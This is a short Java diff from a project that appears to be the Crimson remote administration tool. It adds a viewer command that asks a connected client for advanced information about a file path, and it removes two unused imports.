@@ -19,16 +19,16 @@ package com.subterranean_security.crimson.viewer.net;
 
 import java.io.File;
 import java.io.IOException;
-import java.util.ArrayList;
 import java.util.Date;
 
 import org.slf4j.Logger;
 
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.proto.FileManager.FileListlet;
 import com.subterranean_security.crimson.core.proto.FileManager.MI_CloseFileHandle;
+import com.subterranean_security.crimson.core.proto.FileManager.RQ_AdvancedFileInfo;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
+import com.subterranean_security.crimson.core.proto.FileManager.RS_AdvancedFileInfo;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RQ_Generate;
@@ -328,6 +328,18 @@ public enum ViewerCommands {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
+	}
+
+	public static RS_AdvancedFileInfo fm_file_info(int cid, String path) {
+		try {
+			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
+					.setSid(Common.cvid).setRqAdvancedFileInfo(RQ_AdvancedFileInfo.newBuilder().setFile(path)), 2);
+			return m.getRsAdvancedFileInfo();
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return null;
 	}
 
 	public static void trigger_key_update(int cid, Date target) {
